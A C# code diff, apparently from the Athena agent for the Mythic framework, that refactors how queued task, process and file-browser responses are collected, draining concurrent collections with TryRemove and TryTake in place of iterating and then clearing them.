@@ -1,4 +1,5 @@
 ﻿using System.Collections.Concurrent;
+using System.Diagnostics;
 using Athena.Models;
 using Athena.Models.Mythic.Tasks;
 
@@ -120,39 +121,44 @@ namespace Athena.Commands
         public static async Task<List<string>> GetTaskResponsesAsync()
         {
             List<string> results = new List<string>();
-            foreach (ResponseResult response in responseResults.Values)
+            //responeResults
+
+            foreach(var response in responseResults)
             {
-                if (response.completed)
+                ResponseResult rr;
+                if(responseResults.TryRemove(response.Key, out rr))
                 {
-                    activeJobs.Remove(response.task_id, out _);
+                    results.Add(rr.ToJson());
                 }
-                results.Add(response.ToJson());
-            }
-            foreach (ProcessResponseResult response in processResults.Values)
-            {
-                if (response.completed)
-                {
-                    activeJobs.Remove(response.task_id, out _);
-                }
-                results.Add(response.ToJson());
-            }
-            foreach (FileBrowserResponseResult response in fileBrowserResults.Values)
-            {
-                if (response.completed)
-                {
-                    activeJobs.Remove(response.task_id, out _);
-                }
-                results.Add(response.ToJson());
-            }
-            foreach (string response in responseStrings)
-            {
-                results.Add(response);
             }
 
-            fileBrowserResults.Clear();
-            responseResults.Clear();
-            processResults.Clear();
-            responseStrings.Clear();
+            foreach (var response in processResults)
+            {
+                ProcessResponseResult pr;
+                if (processResults.TryRemove(response.Key, out pr))
+                {
+                    results.Add(pr.ToJson());
+                }
+            }
+
+            foreach (var response in fileBrowserResults)
+            {
+                FileBrowserResponseResult fr;
+                if (fileBrowserResults.TryRemove(response.Key, out fr))
+                {
+                    results.Add(fr.ToJson());
+                }
+            }
+
+            //responseStrings
+            while (!responseStrings.IsEmpty)
+            {
+                string res;
+                if (responseStrings.TryTake(out res))
+                {
+                    results.Add(res);
+                }
+            }
             return results;
         }
     }
